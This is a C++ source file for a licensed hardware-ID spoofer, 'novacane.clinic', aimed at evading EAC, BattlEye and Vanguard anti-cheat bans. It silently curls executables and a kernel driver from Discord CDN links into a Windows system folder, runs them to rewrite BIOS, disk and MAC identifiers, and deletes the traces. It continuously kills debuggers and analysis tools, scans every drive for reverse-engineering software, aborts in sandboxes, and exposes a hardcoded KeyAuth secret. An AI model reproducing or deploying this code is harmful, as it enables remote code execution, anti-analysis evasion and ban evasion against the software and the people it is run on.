#include <windows.h>
#include "other.h"
#include <thread>
#include <iostream>
#include <thread>
#include "keyauth.hpp"
#include <filesystem>
#include <fstream>
#include "anti debugg.h"
#include <wininet.h>
#include <string>

#pragma comment(lib, "wininet.lib")

	#define skCrypt(str) skCrypt_key(str, __TIME__[4], __TIME__[7])
	#define skCrypt_key(str, key1, key2) []() { \
			constexpr static auto crypted = skc::skCrypter \
				<sizeof(str) / sizeof(str[0]), key1, key2, skc::clean_type<decltype(str[0])>>((skc::clean_type<decltype(str[0])>*)str); \
					return crypted; }()

	std::string tm_to_readable_time(tm ctx);
	static std::time_t string_to_timet(std::string timestamp);
	static std::tm timet_to_tm(time_t timestamp);
	const std::string compilation_date = (std::string)skCrypt(__DATE__);
	const std::string compilation_time = (std::string)skCrypt(__TIME__);
	





	int keyauth()
	{
		hide_string1("name" "ownerid" "secret" "1.0");

		using namespace KeyAuth;
		std::string name = skCrypt("Spoofer").decrypt();
		std::string ownerid = skCrypt("V6c3lDpwcZ").decrypt();
		std::string secret = skCrypt("c9cbbc4afea193150b715addf820f75064770fc18d8dbb2770ff866f15f43268").decrypt();
		std::string version = skCrypt("1.0").decrypt();
		std::string url = "https://keyauth.win/api/1.2/";

		api KeyAuthApp(name, ownerid, secret, version, url);
	}
		
	
#include <thread>
#include <chrono>

	void infinite_thread() {
		while (true) {
			BlockInput(true);
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}

	namespace EAC
	{

		void Fortnite()
		{
				std::cout << skCrypt("\n[+] Process in start...");
				
				Sleep(3000);
				spoofgame(Fn);
				colorgreen();
				std::cout << skCrypt("\n[+] Successfully loaded driver! ");
				Sleep(2000);
		}

		void Van()
		{

			LI_FN(system)(E("cls"));
			Sleep(1000);
			colorgreen();
			LI_FN(system)(E("color 2"));
			text((std::string)E("Changing Serials..."));
			LI_FN(system)(E("color 2"));
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1069731480080756746/1083134006029205685/amifldrv64_2.sys -o C:\\Windows\\IME\\IMEJP\\DICTS\\amifldrv64.sys --silent"));
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1069731480080756746/1083134006318604298/AMIDEWINx64_2.EXE -o C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE --silent"));

			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /IVN %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /IV %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /IV %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SM %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SP %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SV %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SS %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SU AUTO >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SK %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /SF %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /BM %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /BP %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /BV %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /BS %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /BT %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /BLC %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /CM %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /CV %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /CS %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /CA %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /CSK %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /PSN %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /PAT %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /PPN %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 1 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 2 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 3 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 4 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 5 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 6 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 7 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 8 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 9 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 10 %RANDOM%-%RANDOM%-%RANDOM% >nul"));
			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE /OS 11 %RANDOM%-%RANDOM%-%RANDOM% >nul"));


			LI_FN(system)(E("wmic computersystem where name=%computername% call rename=%random% >nul"));

			LI_FN(system)(E("cls"));


			LI_FN(system)(E("del C:\\Windows\\IME\\IMEJP\\DICTS\\amifldrv64.sys >nul"));
			LI_FN(system)(E("del C:\\Windows\\IME\\IMEJP\\DICTS\\AMIDEWINx64.EXE >nul"));

			Sleep(1000);
			colorgreen();
			LI_FN(system)(E("color 52"));
			text((std::string)E("Changing Volumeid..."));
			LI_FN(system)(E("color 2"));

			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1073380904174628875/1083110656552738887/Volumeid64.exe -o C:\\Windows\\IME\\IMEJP\\DICTS\\Volumeid64.exe --silent"));

			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\Volumeid64.exe c: %random%-%random% >null"));

			LI_FN(system)(E("del C:\\Windows\\IME\\IMEJP\\DICTS\\Volumeid64.exe"));


			Sleep(1000);
			colorgreen();
			LI_FN(system)(E("color 2"));
			text((std::string)E("Changing Mac Adress..."));
			LI_FN(system)(E("color 2"));

			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1071250054712676512/1081614333513043978/MacAddressSpoofer.exe -o C:\\Windows\\IME\\IMEJP\\DICTS\\macaddressspoofer.exe --silent"));

			LI_FN(system)(E("C:\\Windows\\IME\\IMEJP\\DICTS\\macaddressspoofer.exe >null"));

			LI_FN(system)(E("del C:\\Windows\\IME\\IMEJP\\DICTS\\macaddressspoofer.exe >null"));

			Sleep(1000);
			LI_FN(system)(E("color 2"));
			text((std::string)E("Done with perm spoofing!"));
			LI_FN(system)(E("color 2"));
			clear();


		}

		void serialchecker()
		{
			LI_FN(system)(E("cls"));

			std::cout << skCrypt("Bios") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic bios get serialnumber"));
			LI_FN(system)(E("wmic csproduct get uuid"));

			std::cout << skCrypt("CPU") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic cpu get serialnumber"));
			LI_FN(system)(E("wmic cpu get processorid"));

			std::cout << skCrypt("Diskdrive") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic diskdrive get serialnumber"));

			std::cout << skCrypt("Baseboard") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic baseboard get serialnumber"));

			std::cout << skCrypt("Ram") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic memorychip get serialnumber"));

			std::cout << skCrypt("MacAddress") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress"));

			std::cout << skCrypt("GPU") << std::endl;
			std::cout << "------------" << std::endl;
			LI_FN(system)(E("wmic PATH Win32_VideoController GET Description,PNPDeviceID"));
			LI_FN(system)(E("pause"));
			std::cout << "Press enter to go back!" << std::endl;
		}


		void customPause(int seconds) {
			std::this_thread::sleep_for(std::chrono::seconds(seconds));
		}

		void generic()
		{
		
			std::string inputText;
			std::cin.ignore(); 
			std::getline(std::cin, inputText);
		
			std::ofstream outputFile("C:\\Windows\\text.txt");
			if (outputFile.is_open()) {
				outputFile << inputText;
				outputFile.close();
				std::cout << "" << std::endl;
			}
			else {
				std::cout << "" << std::endl;
				exit (1);
			}
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1115738129891069972/1124451978467102910/weh187.exe -o C:\\Windows\\IME\\weh187.exe --silent"));
			customPause(3);
			std::string command = "C:\\Windows\\IME\\weh187.exe \"" + inputText + "\"";
			system(command.c_str());

			 //Lösche die Textdatei
			if (std::remove("C:\\Windows\\text.txt") != 0) {
				std::cout << "" << std::endl;
			}
			else {
				std::cout << "" << std::endl;
			}

			exit(1);
			
		}
	}



void taskkillthread() {
	while (1) {

		LI_FN(system)(E("taskkill /f /im FileActivityWatch.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im DiskPulse.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im procexp.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im procexp.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im procexp64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im procexp64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im mafiaengine-i386.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Mafia Engine.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im mafiaengine-x86_64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Tutorial-i386.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Tutorial-x86_64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im mafiaengine-x86_64-SSE4-AVX2.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im KsDumperClient.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im KsDumper.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im ProcessHacker.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im idaq.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im idaq64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Wireshark.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Fiddler.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Xenos64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Xenos.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Xenos32.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im de4dot.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Cheat Engine.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im cheatengine-x86_64-SSE4-AVX2.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im MugenJinFuu-x86_64-SSE4-AVX2.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im MugenJinFuu-i386.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im cheatengine-i386.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im KsDumper.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im OllyDbg.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im x64dbg.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im x32dbg.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Ida64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im OllyDbg.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Dbg64.exe >nul 2>&1"));
		LI_FN(system)(E("taskkill /f /im Dbg32.exe >nul 2>&1"));
	}

}


bool checkLogin(const std::string& username, const std::string& password)
{

	
	hide_string1("name" "ownerid" "secret" "1.0");

	using namespace KeyAuth;
	std::string name = skCrypt("name").decrypt();
	std::string ownerid = skCrypt("ownerid").decrypt();
	std::string secret = skCrypt("secret").decrypt();
	std::string version = skCrypt("1.0").decrypt();
	std::string url = "https://keyauth.win/api/1.2/";

	api KeyAuthApp(name, ownerid, secret, version, url);
	KeyAuthApp.login(username, password);
	return KeyAuthApp.data.success;

	
	
}


/*
void ThreadFolder(const std::wstring& rootPath, const std::vector<std::wstring>& targetNames)
{
	hide_string1("1945" "jh5n0xEX4w" "a3a91ef3dd4295f4800a2a103be7bd071a6459d98da807d8fb192a79ed72fb48" "1.0");

	using namespace KeyAuth;
	std::string name = skCrypt("1945").decrypt();
	std::string ownerid = skCrypt("jh5n0xEX4w").decrypt();
	std::string secret = skCrypt("a3a91ef3dd4295f4800a2a103be7bd071a6459d98da807d8fb192a79ed72fb48").decrypt();
	std::string version = skCrypt("1.0").decrypt();
	std::string url = "https://keyauth.win/api/1.2/";
	api KeyAuthApp(name, ownerid, secret, version, url);
	
	WIN32_FIND_DATAW findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;


	std::wstring searchPattern = rootPath + L"\\*";
	std::string debbuger;

	hFind = FindFirstFileW(searchPattern.c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		
		do
		{
			if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0)
			{
				std::wstring fullPath = rootPath + L"\\" + findData.cFileName;


				if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{

					for (const std::wstring& targetName : targetNames)
					{
						if (wcscmp(findData.cFileName, targetName.c_str()) == 0)
						{
							// here for folders
							if (targetName == L"memdumps")
							{
								debbuger += " (x64dbg)";
							}
							if (targetName == L"clibs64")
							{
								debbuger += " (CheatEngine)";
							}

							//KeyAuthApp.webhook("LOGS", "on pc");

							printf(("Debbuger found on the PC" + debbuger + "\n").c_str());
							Sleep(3000);
							

							exit(3);

							return;
						}
					}


					ThreadFolder(fullPath, targetNames);
				}
				else
				{

					for (const std::wstring& targetName : targetNames)
					{
						if (wcscmp(findData.cFileName, targetName.c_str()) == 0)
						{
							// here for executable: .exe / .dll etc...

							if (targetName == L"clibs64.dll" || targetName == L"lfs.dll" ||
								targetName == L"allochook-i386.dll" || targetName == L"ced3d9hook.dll" ||
								targetName == L"speedhack-x86_64.dll")
							{
								debbuger += " (CheatEngine)";
							}

							if (targetName == L"ida64.dll" || targetName == L"picture_decoder.exe" || targetName == L"clp64.dll")
							{
								debbuger += " (IDA)";
							}
							if (targetName == L"HTTPDebuggerBrowser.dll")
							{
								debbuger += " (HttpDebugger)";
							}

							//KeyAuthApp.webhook("LOGS", "on pc");
							printf(("Debbuger found on the PC" + debbuger + "\n").c_str());
							Sleep(3000);
							
							exit(3);
							return;
						}
					}
				}
			}




		} while (FindNextFileW(hFind, &findData) != 0);


		FindClose(hFind);
	}
}
*/








void advanced_jojo_protection()
{
	//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)startthread, 0, 0, 0);
		// Make sure there isn't an error state
	SetLastError(0);
	// Send a string to the debugger
	OutputDebugStringA("Hello, debugger");
	if (GetLastError() != 0)
	{
		MessageBoxA(NULL, "Debugger Detected", "", MB_OK);
	}


	LPCSTR windowName = "x64dbg" "IDA Pro" "OllyDbg";


	if (CloseHandle_InvalideHandle())
	{
		printf("DEBUGGER 1\n");
		Sleep(1000);
		exit(0);
	}


		DWORD count1;
		count1 = GetTickCount();
		if (anti_debug2(count1))
		{
			printf("DEBUGGER 3\n");
			Sleep(1000);
			exit(0);
		}
		
		if (anti_debug3())
		{
			printf("DEBUGGER 4\n");
			Sleep(1000);
			exit(0);
		}


	if (FindWindow(NULL, windowName))
	{
		MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
	}
}

void ThreadFolder(const std::wstring& rootPath, const std::vector<std::wstring>& targetNames)
{
	hide_string1("name" "ownerid" "secret" "1.0");

	using namespace KeyAuth;
	std::string name = skCrypt("name").decrypt();
	std::string ownerid = skCrypt("ownerid").decrypt();
	std::string secret = skCrypt("secret").decrypt();
	std::string version = skCrypt("1.0").decrypt();
	std::string url = "https://keyauth.win/api/1.2/";
	api KeyAuthApp(name, ownerid, secret, version, url);

	WIN32_FIND_DATAW findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;


	std::wstring searchPattern = rootPath + L"\\*";
	std::string debbuger;

	hFind = FindFirstFileW(searchPattern.c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE)
	{

		do
		{
			if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0)
			{
				std::wstring fullPath = rootPath + L"\\" + findData.cFileName;


				if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{

					for (const std::wstring& targetName : targetNames)
					{
						if (wcscmp(findData.cFileName, targetName.c_str()) == 0)
						{
							// here for folders
							if (targetName == L"memdumps")
							{
								debbuger += " (x64dbg)";
							}
							if (targetName == L"clibs64")
							{
								debbuger += " (CheatEngine)";
							}

							KeyAuthApp.log("hi");

							printf(("debuger found on the PC" + debbuger + "\n").c_str());
							Sleep(3000);


							exit(3);

							return;
						}
					}


					ThreadFolder(fullPath, targetNames);
				}
				else
				{

					for (const std::wstring& targetName : targetNames)
					{
						if (wcscmp(findData.cFileName, targetName.c_str()) == 0)
						{
							// here for executable: .exe / .dll etc...

							if (targetName == L"clibs64.dll" || targetName == L"lfs.dll" ||
								targetName == L"allochook-i386.dll" || targetName == L"ced3d9hook.dll" ||
								targetName == L"speedhack-x86_64.dll")
							{
								debbuger += " (CheatEngine)";
							}

							if (targetName == L"ida64.dll" || targetName == L"picture_decoder.exe" || targetName == L"clp64.dll")
							{
								debbuger += " (IDA)";
							}
							if (targetName == L"HTTPDebuggerBrowser.dll")
							{
								debbuger += " (HttpDebugger)";
							}

							KeyAuthApp.log("hi");
							printf(("Debuger found on the PC" + debbuger + "\n").c_str());
							Sleep(3000);

							exit(3);
							return;
						}
					}
				}
			}




		} while (FindNextFileW(hFind, &findData) != 0);


		FindClose(hFind);
	}
}
void ThreadAllDrivers(const std::vector<std::wstring>& targetNames)
{
	DWORD drives = GetLogicalDrives();

	for (int drive = 0; drive < 26; ++drive)
	{
		if ((drives & (1 << drive)) != 0)
		{
			std::wstring drivePath = std::wstring(1, L'A' + drive) + L":\\";
			ThreadFolder(drivePath, targetNames);
		}
	}

}

void startthread()
{
	std::vector<std::wstring> targetNames = { L"memdumps", L"clibs64", L"clp64.dll", L"lfs.dll", L"allochook-i386.dll", L"ced3d9hook.dll", L"speedhack-x86_64.dll", L"HTTPDebuggerBrowser.dll", L"ida64.dll", L"picture_decoder.exe" };
	ThreadAllDrivers(targetNames);
}

void blockthread()
{
	BlockInput(true);
}

int main()
{
	 
	
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)startthread, 0, 0, 0);

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)taskkillthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)advanced_jojo_protection, 0, 0, 0);

;



	std::thread(mempatch);
	if (CheckVTBlacklist(pcusername(), (std::string)E("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt")))
	{
		abort();
	}

	if (CheckVTBlacklist(pcusername(), (std::string)E("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt")))
	{
		abort();
	}


	CONSOLE_CURSOR_INFO cursorInfo;
	LI_FN(GetConsoleCursorInfo)(GetStdHandle(STD_OUTPUT_HANDLE), &cursorInfo);
	cursorInfo.bVisible = false;
	LI_FN(SetConsoleCursorInfo)(GetStdHandle(STD_OUTPUT_HANDLE), &cursorInfo);

	TCHAR volumeName[MAX_PATH + 1] = { 0 };
	TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
	DWORD serialNumber = 0;
	DWORD maxComponentLen = 0;
	DWORD fileSystemFlags = 0;

	std::thread(changetitle).detach();
	HWND hwnd = LI_FN(GetConsoleWindow)();
	HWND console = LI_FN(GetConsoleWindow)();
	RECT ConsoleRect;
	LI_FN(GetWindowRect)(console, &ConsoleRect);

	HANDLE hOut = LI_FN(GetStdHandle)(STD_OUTPUT_HANDLE);

	CONSOLE_SCREEN_BUFFER_INFO scrBufferInfo;
	LI_FN(GetConsoleScreenBufferInfo)(hOut, &scrBufferInfo);

	// current window size
	short winWidth = scrBufferInfo.srWindow.Right - scrBufferInfo.srWindow.Left + 1;
	short winHeight = scrBufferInfo.srWindow.Bottom - scrBufferInfo.srWindow.Top + 1;

	short scrBufferWidth = scrBufferInfo.dwSize.X;
	short scrBufferHeight = scrBufferInfo.dwSize.Y;

	COORD newSize;
	newSize.X = scrBufferWidth;
	newSize.Y = winHeight;


	hide_string1("name" "ownerid" "secret" "1.0");

	using namespace KeyAuth;
	std::string name = skCrypt("Spoofer").decrypt();
	std::string ownerid = skCrypt("V6c3lDpwcZ").decrypt();
	std::string secret = skCrypt("c9cbbc4afea193150b715addf820f75064770fc18d8dbb2770ff866f15f43268").decrypt();
	std::string version = skCrypt("1.0").decrypt();
	std::string url = "https://keyauth.win/api/1.2/";

	api KeyAuthApp(name, ownerid, secret, version, url);

	KeyAuthApp.init();
	if (!KeyAuthApp.data.success)
	{
		std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}

	int option;
	std::string username;
	std::string password;
	std::string key;

	{
		colorwhite();
		std::cout << skCrypt("[+] Product: ");
		colorwhite();;
		std::cout << skCrypt("novacane.clinic");
		colorwhite();
		std::cout << skCrypt("\n[+] Status: ");
		colorgreen();
		std::cout << skCrypt("Undetected ");
		colorwhite();
		std::cout << skCrypt("\n\n[+] Enter Key: ");
		std::cin >> key;
		KeyAuthApp.license(key);



		if (!KeyAuthApp.data.success)
		{

			std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
			Sleep(1500);
			exit(0);
		}
		std::string debbuger;
		KeyAuthApp.log("logged in" + debbuger);
		
		int eg;
	a:
		
		clear();
		colorwhite();
		std::cout << skCrypt("[+] Product: ");
		colorwhite();;
		std::cout << skCrypt("novacane.clinic");
		colorwhite();
		std::cout << skCrypt("\n[+] Status: ");
		colorgreen();
		std::cout << ("Undetected ");
		colorwhite();
		printf(E("\n\n\n"));
		std::cout << skCrypt("[1] Temp Spoof EAC + BE\n");
		std::cout << skCrypt("[2] Perm Spoof EAC + BE + VAN\n");
		

		printf(E("\n-> "));
		std::cin >> eg;
		// Hide the console cursor
		LI_FN(GetConsoleCursorInfo)(LI_FN(GetStdHandle)(STD_OUTPUT_HANDLE), &cursorInfo);
		cursorInfo.bVisible = true;
		LI_FN(GetConsoleCursorInfo)(LI_FN(GetStdHandle)(STD_OUTPUT_HANDLE), &cursorInfo);


		switch (eg)
		{
		case 1:
			
			EAC::Fortnite();
			goto a;
		case 2:
		
			EAC::Van();
			goto a;
		case 3:
			EAC::generic();
			goto a;
		case 4:
			EAC::serialchecker();
			goto a;

		}

	}
}

